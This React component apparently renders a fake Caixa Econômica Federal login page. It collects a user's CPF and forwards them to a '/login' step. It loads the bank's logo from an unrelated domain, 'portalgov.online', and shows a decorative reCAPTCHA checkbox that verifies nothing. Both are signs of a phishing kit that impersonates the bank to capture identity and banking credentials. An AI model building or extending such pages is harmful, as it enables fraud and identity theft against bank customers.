
import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Checkbox } from '@/components/ui/checkbox';

const CPFEntry = () => {
  const [cpf, setCpf] = useState('');
  const navigate = useNavigate();

  const formatCPF = (value: string) => {
    // Remove non-digits
    const digits = value.replace(/\D/g, '');
    
    // CPF has a maximum of 11 digits
    if (digits.length > 11) {
      return digits.slice(0, 11);
    }
    
    return digits;
  };

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value;
    setCpf(formatCPF(rawValue));
  };

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (cpf.length === 11) {
      navigate('/login');
    }
  };

  return (
    <div className="bg-blue-50 min-h-screen flex flex-col">
      <div className="container mx-auto px-6 py-6 flex-1 flex flex-col items-center max-w-md">
        <motion.div 
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="w-full flex justify-center mb-6"
        >
          <img 
            src="https://portalgov.online/Caixa_Econômica_Federal_logo.svg.png" 
            alt="Caixa Econômica Federal" 
            className="h-12 w-auto"
          />
        </motion.div>

        <motion.div 
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.6, delay: 0.2 }}
          className="text-blue-700 text-center mb-6"
        >
          <h1 className="text-xl font-medium">Login Caixa</h1>
        </motion.div>

        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.6, delay: 0.3 }}
          className="text-gray-600 text-center mb-6"
        >
          <p>Informe seu CPF e clique em "Próximo" para continuar:</p>
        </motion.div>

        <motion.form
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.4 }}
          className="w-full"
          onSubmit={handleNext}
        >
          <div className="mb-6">
            <div className="flex items-center gap-2 mb-2">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-500" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
              </svg>
              <span className="text-gray-600">CPF</span>
            </div>
            <Input
              type="text"
              value={cpf}
              onChange={handleCPFChange}
              className="w-full border-b-2 border-gray-300 focus:border-blue-500 py-2 bg-transparent"
              placeholder="Digite seu CPF"
              maxLength={11}
              required
            />
          </div>

          <div className="flex items-start space-x-2 mb-6">
            <Checkbox id="captcha" />
            <div className="grid gap-1.5 leading-none">
              <label
                htmlFor="captcha"
                className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
              >
                Não sou um robô
              </label>
              <div className="flex items-center text-xs text-gray-500">
                <span>reCAPTCHA</span>
                <span className="mx-1">•</span>
                <span>Privacidade</span>
                <span className="mx-1">•</span>
                <span>Termos</span>
              </div>
            </div>
          </div>

          <Button
            type="submit"
            className="w-full bg-blue-100 hover:bg-blue-200 text-blue-600 py-3 mb-4"
          >
            Próximo
          </Button>

          <div className="flex flex-col space-y-4 text-center">
            <p className="text-blue-600">
              É novo por aqui? <span className="text-blue-600 font-medium border-b border-blue-600">Cadastre-se</span>
            </p>
            <p className="text-blue-600">
              Preciso de ajuda
            </p>
          </div>
        </motion.form>
      </div>
    </div>
  );
};

export default CPFEntry;
